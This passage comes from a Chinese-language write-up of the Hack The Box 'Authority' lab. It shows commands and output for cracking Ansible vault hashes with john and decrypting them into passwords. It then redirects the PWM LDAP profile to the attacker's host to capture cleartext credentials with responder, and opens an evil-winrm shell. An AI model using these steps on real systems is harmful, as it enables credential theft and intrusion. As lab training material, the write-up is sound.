</span><span id="__span-9-12"><a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a>└─$<span class="w"> </span>ansible<span class="w"> </span>--version
</span><span id="__span-9-13"><a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a>ansible<span class="w"> </span><span class="o">[</span>core<span class="w"> </span><span class="m">2</span>.15.2<span class="o">]</span>
</span><span id="__span-9-14"><a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a><span class="w">  </span>config<span class="w"> </span><span class="nv">file</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>None
</span><span id="__span-9-15"><a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a><span class="w">  </span>configured<span class="w"> </span>module<span class="w"> </span>search<span class="w"> </span><span class="nv">path</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span><span class="s1">&#39;/home/kali/.ansible/plugins/modules&#39;</span>,<span class="w"> </span><span class="s1">&#39;/usr/share/ansible/plugins/modules&#39;</span><span class="o">]</span>
</span><span id="__span-9-16"><a id="__codelineno-9-16" name="__codelineno-9-16" href="#__codelineno-9-16"></a><span class="w">  </span>ansible<span class="w"> </span>python<span class="w"> </span>module<span class="w"> </span><span class="nv">location</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>/home/kali/.local/lib/python3.9/site-packages/ansible
</span><span id="__span-9-17"><a id="__codelineno-9-17" name="__codelineno-9-17" href="#__codelineno-9-17"></a><span class="w">  </span>ansible<span class="w"> </span>collection<span class="w"> </span><span class="nv">location</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>/home/kali/.ansible/collections:/usr/share/ansible/collections
</span><span id="__span-9-18"><a id="__codelineno-9-18" name="__codelineno-9-18" href="#__codelineno-9-18"></a><span class="w">  </span>executable<span class="w"> </span><span class="nv">location</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>/home/kali/.local/bin/ansible
</span><span id="__span-9-19"><a id="__codelineno-9-19" name="__codelineno-9-19" href="#__codelineno-9-19"></a><span class="w">  </span>python<span class="w"> </span><span class="nv">version</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">3</span>.9.7<span class="w"> </span><span class="o">(</span>default,<span class="w"> </span>Jul<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">2023</span>,<span class="w"> </span><span class="m">22</span>:35:31<span class="o">)</span><span class="w"> </span><span class="o">[</span>GCC<span class="w"> </span><span class="m">12</span>.2.0<span class="o">]</span><span class="w"> </span><span class="o">(</span>/usr/local/bin/python3.9<span class="o">)</span>
</span><span id="__span-9-20"><a id="__codelineno-9-20" name="__codelineno-9-20" href="#__codelineno-9-20"></a><span class="w">  </span>jinja<span class="w"> </span><span class="nv">version</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">3</span>.1.2
</span><span id="__span-9-21"><a id="__codelineno-9-21" name="__codelineno-9-21" href="#__codelineno-9-21"></a><span class="w">  </span><span class="nv">libyaml</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>True
</span><span id="__span-9-22"><a id="__codelineno-9-22" name="__codelineno-9-22" href="#__codelineno-9-22"></a>
</span><span id="__span-9-23"><a id="__codelineno-9-23" name="__codelineno-9-23" href="#__codelineno-9-23"></a>└─$<span class="w"> </span>python3.9<span class="w"> </span>-m<span class="w"> </span>pip<span class="w"> </span>install<span class="w"> </span><span class="s2">&quot;pywinrm&gt;=0.3.0&quot;</span>
</span></code></pre></div></p>
<h4 id="python39ansible">python3.9的ansible运行结果<a class="headerlink" href="#python39ansible" title="Permanent link">&para;</a></h4>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>└─$<span class="w"> </span>ansible<span class="w"> </span>-i<span class="w"> </span>ansible_inventory.yml<span class="w"> </span>-m<span class="w"> </span>win_ping<span class="w"> </span>HTB<span class="w"> </span>
</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="m">10</span>.10.11.222<span class="w"> </span><span class="p">|</span><span class="w"> </span>UNREACHABLE!<span class="w"> </span><span class="o">=</span>&gt;<span class="w"> </span><span class="o">{</span>
</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="w">    </span><span class="s2">&quot;changed&quot;</span>:<span class="w"> </span>false,
</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="w">    </span><span class="s2">&quot;msg&quot;</span>:<span class="w"> </span><span class="s2">&quot;ntlm: the specified credentials were rejected by the server&quot;</span>,
</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="w">    </span><span class="s2">&quot;unreachable&quot;</span>:<span class="w"> </span><span class="nb">true</span>
</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="o">}</span>
</span></code></pre></div>
<p>拒绝NTLM认证？难道是兔子洞？？</p>
<h3 id="vault">破解vault<a class="headerlink" href="#vault" title="Permanent link">&para;</a></h3>
<p>对于前面发现的3个vault加密，看看john能否破解。</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Authority/nmapscan<span class="o">]</span>
</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>└─$<span class="w"> </span>john<span class="w"> </span>--list<span class="o">=</span>formats<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>ansible
</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>aix-ssha512,<span class="w"> </span>andOTP,<span class="w"> </span>ansible,<span class="w"> </span>argon2,<span class="w"> </span>as400-des,<span class="w"> </span>as400-ssha1,<span class="w"> </span>asa-md5,<span class="w"> </span>
</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="m">416</span><span class="w"> </span>formats<span class="w"> </span><span class="o">(</span><span class="m">149</span><span class="w"> </span>dynamic<span class="w"> </span>formats<span class="w"> </span>shown<span class="w"> </span>as<span class="w"> </span>just<span class="w"> </span><span class="s2">&quot;dynamic_n&quot;</span><span class="w"> </span>here<span class="o">)</span>
</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>
</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/…/SMB/Automation/Ansible/PWM<span class="o">]</span>
</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>└─$<span class="w"> </span>ansible2john<span class="w"> </span>vault-ldap-pw.txt<span class="w"> </span>&gt;<span class="w"> </span>vault-ldap-pw.hash
</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>
</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/…/SMB/Automation/Ansible/PWM<span class="o">]</span>
</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a>└─$<span class="w"> </span>john<span class="w"> </span>--wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>--format<span class="o">=</span>ansible<span class="w"> </span>vault-ldap-pw.hash
</span><span id="__span-11-11"><a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a>Using<span class="w"> </span>default<span class="w"> </span>input<span class="w"> </span>encoding:<span class="w"> </span>UTF-8
</span><span id="__span-11-12"><a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a>Loaded<span class="w"> </span><span class="m">1</span><span class="w"> </span>password<span class="w"> </span><span class="nb">hash</span><span class="w"> </span><span class="o">(</span>ansible,<span class="w"> </span>Ansible<span class="w"> </span>Vault<span class="w"> </span><span class="o">[</span>PBKDF2-SHA256<span class="w"> </span>HMAC-256<span class="w"> </span><span class="m">128</span>/128<span class="w"> </span>AVX<span class="w"> </span>4x<span class="o">])</span>
</span><span id="__span-11-13"><a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a>Cost<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">(</span>iteration<span class="w"> </span>count<span class="o">)</span><span class="w"> </span>is<span class="w"> </span><span class="m">10000</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>all<span class="w"> </span>loaded<span class="w"> </span>hashes
</span><span id="__span-11-14"><a id="__codelineno-11-14" name="__codelineno-11-14" href="#__codelineno-11-14"></a>Will<span class="w"> </span>run<span class="w"> </span><span class="m">8</span><span class="w"> </span>OpenMP<span class="w"> </span>threads
</span><span id="__span-11-15"><a id="__codelineno-11-15" name="__codelineno-11-15" href="#__codelineno-11-15"></a>Press<span class="w"> </span><span class="s1">&#39;q&#39;</span><span class="w"> </span>or<span class="w"> </span>Ctrl-C<span class="w"> </span>to<span class="w"> </span>abort,<span class="w"> </span>almost<span class="w"> </span>any<span class="w"> </span>other<span class="w"> </span>key<span class="w"> </span><span class="k">for</span><span class="w"> </span>status
</span><span id="__span-11-16"><a id="__codelineno-11-16" name="__codelineno-11-16" href="#__codelineno-11-16"></a>!@#$%^<span class="p">&amp;</span>*<span class="w">         </span><span class="o">(</span>vault-ldap-pw.txt<span class="o">)</span>
</span></code></pre></div>
<p>3个vault的破解结果一样——因为这是vault的密码。然后用vault密码对各个vault字符进行解密：
<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>┌──<span class="o">(</span>venv-ansible<span class="o">)</span>─<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/…/SMB/Automation/Ansible/PWM<span class="o">]</span>
</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>└─$<span class="w"> </span>cat<span class="w"> </span>vault-admin-login.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>ansible-vault<span class="w"> </span>decrypt<span class="w"> </span>
</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>Vault<span class="w"> </span>password:<span class="w"> </span>
</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>Decryption<span class="w"> </span>successful
</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>svc_pwm
</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>┌──<span class="o">(</span>venv-ansible<span class="o">)</span>─<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/…/SMB/Automation/Ansible/PWM<span class="o">]</span>
</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>└─$<span class="w"> </span>cat<span class="w"> </span>vault-admin-pw.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>ansible-vault<span class="w"> </span>decrypt
</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>Vault<span class="w"> </span>password:<span class="w"> </span>
</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a>Decryption<span class="w"> </span>successful
</span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a>pWm_@dm!N_!23
</span><span id="__span-12-11"><a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a>┌──<span class="o">(</span>venv-ansible<span class="o">)</span>─<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/…/SMB/Automation/Ansible/PWM<span class="o">]</span>
</span><span id="__span-12-12"><a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a>└─$<span class="w"> </span>cat<span class="w"> </span>vault-ldap-pw.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>ansible-vault<span class="w"> </span>decrypt<span class="w"> </span>
</span><span id="__span-12-13"><a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a>Vault<span class="w"> </span>password:<span class="w"> </span>
</span><span id="__span-12-14"><a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a>Decryption<span class="w"> </span>successful
</span><span id="__span-12-15"><a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a>DevT3st@123<span class="w"> </span>
</span></code></pre></div></p>
<ul>
<li>pwm_admin_login：svc_pwm</li>
<li>pwm_admin_password：pWm_@dm!N_!23</li>
<li>ldap_admin_password：DevT3st@123</li>
</ul>
<p>算是得到两组凭据？其中 <code>svc_pwm</code> 也在 <code>ansible.cfg</code> 中有定义“remote_user = svc_pwm”。于是将清单里的账号密码改成svc_pwm这个又试了一下ansible执行，不过依旧报一样的错。估计这条路是真的不行吧……<br />
暂时不知道这些凭据在哪里使用，继续进行探索。</p>
<h2 id="80">80端口<a class="headerlink" href="#80" title="Permanent link">&para;</a></h2>
<p>IIS的默认界面，没发现其他什么有用的信息。</p>
<h2 id="8443">8443端口<a class="headerlink" href="#8443" title="Permanent link">&para;</a></h2>
<p>访问 <code>10.10.11.222:8443</code>，会报错需要TLS。那么试试 <code>https://10.10.11.222:8443</code>，会重定向到 <code>https://10.10.11.222:8443/pwm/private/login</code>。</p>
<p><a class="glightbox" href="../../evidence-img/HTB-Authority-8443.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="HTB-Authority-8443" src="../../evidence-img/HTB-Authority-8443.png" /></a></p>
<p>尝试用前面的凭据登录，都报错。</p>
<p>然后点击下面的按钮，只需要密码。像是要ldap的，而前面有个密码正好不知道用户名，想着可能就是这里用，但是结果登陆失败。<br />
不过注意到页面下方的认证记录？有写用户名是 <code>svc_pwm</code>，那么看来是该用前面破解的 <code>svc_pwm</code>:<code>pWm_@dm!N_!23</code> 这组凭据。其实所有凭据都试一遍最终也可以登入。（后来才发觉这就是PWM的管理界面）</p>
<p><a class="glightbox" href="../../evidence-img/HTB-Authority-8443-loginError.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="HTB-Authority-8443-loginError" src="../../evidence-img/HTB-Authority-8443-loginError.png" /></a></p>
<p>尝试输入密码，成功登入</p>
<p><a class="glightbox" href="../../evidence-img/HTB-Authority-8443-logined.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="HTB-Authority-8443-logined" src="../../evidence-img/HTB-Authority-8443-logined.png" /></a></p>
<h2 id="initial-access">Initial Access<a class="headerlink" href="#initial-access" title="Permanent link">&para;</a></h2>
<p>可以在上图的WARN看到LDAP服务器 <code>ldaps://authority.authority.htb:636</code>。找到配置尝试添加kali为LDAP服务器。</p>
<p><a class="glightbox" href="../../evidence-img/HTB-Authority-8443-ldap-setting.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="HTB-Authority-8443-ldap-setting" src="../../evidence-img/HTB-Authority-8443-ldap-setting.png" /></a></p>
<p>执行<code>sudo responder -I tun0 -v</code>，然后点击 <code>Test LDAP Profile</code>，可以收到明文凭据 <code>svc_ldap:lDaP_1n_th3_cle4r!</code>：
<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>（略）
</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Servers:
</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>（略）
</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="w">    </span>LDAP<span class="w"> </span>server<span class="w">                </span><span class="o">[</span>ON<span class="o">]</span>
</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>（略）
</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Listening<span class="w"> </span><span class="k">for</span><span class="w"> </span>events...<span class="w">                                                                                         </span>
</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>
</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a><span class="o">[</span>LDAP<span class="o">]</span><span class="w"> </span>Attempting<span class="w"> </span>to<span class="w"> </span>parse<span class="w"> </span>an<span class="w"> </span>old<span class="w"> </span>simple<span class="w"> </span>Bind<span class="w"> </span>request.
</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a><span class="o">[</span>LDAP<span class="o">]</span><span class="w"> </span>Cleartext<span class="w"> </span>Client<span class="w">   </span>:<span class="w"> </span><span class="m">10</span>.10.11.222
</span><span id="__span-13-10"><a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a><span class="o">[</span>LDAP<span class="o">]</span><span class="w"> </span>Cleartext<span class="w"> </span>Username<span class="w"> </span>:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>svc_ldap,OU<span class="o">=</span>Service<span class="w"> </span>Accounts,OU<span class="o">=</span>CORP,DC<span class="o">=</span>authority,DC<span class="o">=</span>htb
</span><span id="__span-13-11"><a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a><span class="o">[</span>LDAP<span class="o">]</span><span class="w"> </span>Cleartext<span class="w"> </span>Password<span class="w"> </span>:<span class="w"> </span>lDaP_1n_th3_cle4r!
</span><span id="__span-13-12"><a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a>（略）
</span></code></pre></div></p>
<p>由于开放了5985端口，尝试 <code>evil-winrm</code> 连接：
<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>┌──<span class="o">(</span>venv-ansible<span class="o">)</span>─<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Authority<span class="o">]</span>
</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>└─$<span class="w"> </span>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="m">10</span>.10.11.222<span class="w"> </span>-u<span class="w"> </span>svc_ldap<span class="w"> </span>-p<span class="w"> </span>lDaP_1n_th3_cle4r!
</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>（略）
</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\s</span>vc_ldap<span class="se">\D</span>ocuments&gt;<span class="w"> </span>whoami
</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>htb<span class="se">\s</span>vc_ldap
</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>
</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\s</span>vc_ldap<span class="se">\D</span>ownloads&gt;<span class="w"> </span>whoami<span class="w"> </span>/all
</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a>
</span><span id="__span-14-9"><a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a>USER<span class="w"> </span>INFORMATION
</span><span id="__span-14-10"><a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a>----------------
</span><span id="__span-14-11"><a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a>
</span><span id="__span-14-12"><a id="__codelineno-14-12" name="__codelineno-14-12" href="#__codelineno-14-12"></a>User<span class="w"> </span>Name<span class="w">    </span><span class="nv">SID</span>
</span><span id="__span-14-13"><a id="__codelineno-14-13" name="__codelineno-14-13" href="#__codelineno-14-13"></a><span class="o">============</span><span class="w"> </span><span class="o">=============================================</span>
</span><span id="__span-14-14"><a id="__codelineno-14-14" name="__codelineno-14-14" href="#__codelineno-14-14"></a>htb<span class="se">\s</span>vc_ldap<span class="w"> </span>S-1-5-21-622327497-3269355298-2248959698-1601
</span><span id="__span-14-15"><a id="__codelineno-14-15" name="__codelineno-14-15" href="#__codelineno-14-15"></a>
</span><span id="__span-14-16"><a id="__codelineno-14-16" name="__codelineno-14-16" href="#__codelineno-14-16"></a>
</span><span id="__span-14-17"><a id="__codelineno-14-17" name="__codelineno-14-17" href="#__codelineno-14-17"></a>GROUP<span class="w"> </span>INFORMATION
</span><span id="__span-14-18"><a id="__codelineno-14-18" name="__codelineno-14-18" href="#__codelineno-14-18"></a>-----------------
</span><span id="__span-14-19"><a id="__codelineno-14-19" name="__codelineno-14-19" href="#__codelineno-14-19"></a>
</span><span id="__span-14-20"><a id="__codelineno-14-20" name="__codelineno-14-20" href="#__codelineno-14-20"></a>Group<span class="w"> </span>Name<span class="w">                                  </span>Type<span class="w">             </span>SID<span class="w">          </span><span class="nv">Attributes</span>
</span><span id="__span-14-21"><a id="__codelineno-14-21" name="__codelineno-14-21" href="#__codelineno-14-21"></a><span class="o">===========================================</span><span class="w"> </span><span class="o">================</span><span class="w"> </span><span class="o">============</span><span class="w"> </span><span class="o">==================================================</span>
</span><span id="__span-14-22"><a id="__codelineno-14-22" name="__codelineno-14-22" href="#__codelineno-14-22"></a>Everyone<span class="w">                                    </span>Well-known<span class="w"> </span>group<span class="w"> </span>S-1-1-0<span class="w">      </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
</span><span id="__span-14-23"><a id="__codelineno-14-23" name="__codelineno-14-23" href="#__codelineno-14-23"></a>BUILTIN<span class="se">\R</span>emote<span class="w"> </span>Management<span class="w"> </span>Users<span class="w">             </span>Alias<span class="w">            </span>S-1-5-32-580<span class="w"> </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
</span><span id="__span-14-24"><a id="__codelineno-14-24" name="__codelineno-14-24" href="#__codelineno-14-24"></a>BUILTIN<span class="se">\U</span>sers<span class="w">                               </span>Alias<span class="w">            </span>S-1-5-32-545<span class="w"> </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
</span><span id="__span-14-25"><a id="__codelineno-14-25" name="__codelineno-14-25" href="#__codelineno-14-25"></a>BUILTIN<span class="se">\P</span>re-Windows<span class="w"> </span><span class="m">2000</span><span class="w"> </span>Compatible<span class="w"> </span>Access<span class="w">  </span>Alias<span class="w">            </span>S-1-5-32-554<span class="w"> </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
</span><span id="__span-14-26"><a id="__codelineno-14-26" name="__codelineno-14-26" href="#__codelineno-14-26"></a>BUILTIN<span class="se">\C</span>ertificate<span class="w"> </span>Service<span class="w"> </span>DCOM<span class="w"> </span>Access<span class="w">     </span>Alias<span class="w">            </span>S-1-5-32-574<span class="w"> </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
</span><span id="__span-14-27"><a id="__codelineno-14-27" name="__codelineno-14-27" href="#__codelineno-14-27"></a>NT<span class="w"> </span>AUTHORITY<span class="se">\N</span>ETWORK<span class="w">                        </span>Well-known<span class="w"> </span>group<span class="w"> </span>S-1-5-2<span class="w">      </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
</span><span id="__span-14-28"><a id="__codelineno-14-28" name="__codelineno-14-28" href="#__codelineno-14-28"></a>NT<span class="w"> </span>AUTHORITY<span class="se">\A</span>uthenticated<span class="w"> </span>Users<span class="w">            </span>Well-known<span class="w"> </span>group<span class="w"> </span>S-1-5-11<span class="w">     </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
</span><span id="__span-14-29"><a id="__codelineno-14-29" name="__codelineno-14-29" href="#__codelineno-14-29"></a>NT<span class="w"> </span>AUTHORITY<span class="se">\T</span>his<span class="w"> </span>Organization<span class="w">              </span>Well-known<span class="w"> </span>group<span class="w"> </span>S-1-5-15<span class="w">     </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
</span><span id="__span-14-30"><a id="__codelineno-14-30" name="__codelineno-14-30" href="#__codelineno-14-30"></a>NT<span class="w"> </span>AUTHORITY<span class="se">\N</span>TLM<span class="w"> </span>Authentication<span class="w">            </span>Well-known<span class="w"> </span>group<span class="w"> </span>S-1-5-64-10<span class="w">  </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
</span><span id="__span-14-31"><a id="__codelineno-14-31" name="__codelineno-14-31" href="#__codelineno-14-31"></a>Mandatory<span class="w"> </span>Label<span class="se">\M</span>edium<span class="w"> </span>Plus<span class="w"> </span>Mandatory<span class="w"> </span>Level<span class="w"> </span>Label<span class="w">            </span>S-1-16-8448
</span><span id="__span-14-32"><a id="__codelineno-14-32" name="__codelineno-14-32" href="#__codelineno-14-32"></a>
</span><span id="__span-14-33"><a id="__codelineno-14-33" name="__codelineno-14-33" href="#__codelineno-14-33"></a>
</span><span id="__span-14-34"><a id="__codelineno-14-34" name="__codelineno-14-34" href="#__codelineno-14-34"></a>PRIVILEGES<span class="w"> </span>INFORMATION
</span><span id="__span-14-35"><a id="__codelineno-14-35" name="__codelineno-14-35" href="#__codelineno-14-35"></a>----------------------
</span><span id="__span-14-36"><a id="__codelineno-14-36" name="__codelineno-14-36" href="#__codelineno-14-36"></a>
</span><span id="__span-14-37"><a id="__codelineno-14-37" name="__codelineno-14-37" href="#__codelineno-14-37"></a>Privilege<span class="w"> </span>Name<span class="w">                </span>Description<span class="w">                    </span><span class="nv">State</span>
</span><span id="__span-14-38"><a id="__codelineno-14-38" name="__codelineno-14-38" href="#__codelineno-14-38"></a><span class="o">=============================</span><span class="w"> </span><span class="o">==============================</span><span class="w"> </span><span class="o">=======</span>
</span><span id="__span-14-39"><a id="__codelineno-14-39" name="__codelineno-14-39" href="#__codelineno-14-39"></a>SeMachineAccountPrivilege<span class="w">     </span>Add<span class="w"> </span>workstations<span class="w"> </span>to<span class="w"> </span>domain<span class="w">     </span>Enabled
</span><span id="__span-14-40"><a id="__codelineno-14-40" name="__codelineno-14-40" href="#__codelineno-14-40"></a>SeChangeNotifyPrivilege<span class="w">       </span>Bypass<span class="w"> </span>traverse<span class="w"> </span>checking<span class="w">       </span>Enabled
</span><span id="__span-14-41"><a id="__codelineno-14-41" name="__codelineno-14-41" href="#__codelineno-14-41"></a>SeIncreaseWorkingSetPrivilege<span class="w"> </span>Increase<span class="w"> </span>a<span class="w"> </span>process<span class="w"> </span>working<span class="w"> </span><span class="nb">set</span><span class="w"> </span>Enabled
</span><span id="__span-14-42"><a id="__codelineno-14-42" name="__codelineno-14-42" href="#__codelineno-14-42"></a>
</span><span id="__span-14-43"><a id="__codelineno-14-43" name="__codelineno-14-43" href="#__codelineno-14-43"></a>
</span><span id="__span-14-44"><a id="__codelineno-14-44" name="__codelineno-14-44" href="#__codelineno-14-44"></a>USER<span class="w"> </span>CLAIMS<span class="w"> </span>INFORMATION
</span><span id="__span-14-45"><a id="__codelineno-14-45" name="__codelineno-14-45" href="#__codelineno-14-45"></a>-----------------------
</span><span id="__span-14-46"><a id="__codelineno-14-46" name="__codelineno-14-46" href="#__codelineno-14-46"></a>
</span><span id="__span-14-47"><a id="__codelineno-14-47" name="__codelineno-14-47" href="#__codelineno-14-47"></a>User<span class="w"> </span>claims<span class="w"> </span>unknown.
</span><span id="__span-14-48"><a id="__codelineno-14-48" name="__codelineno-14-48" href="#__codelineno-14-48"></a>
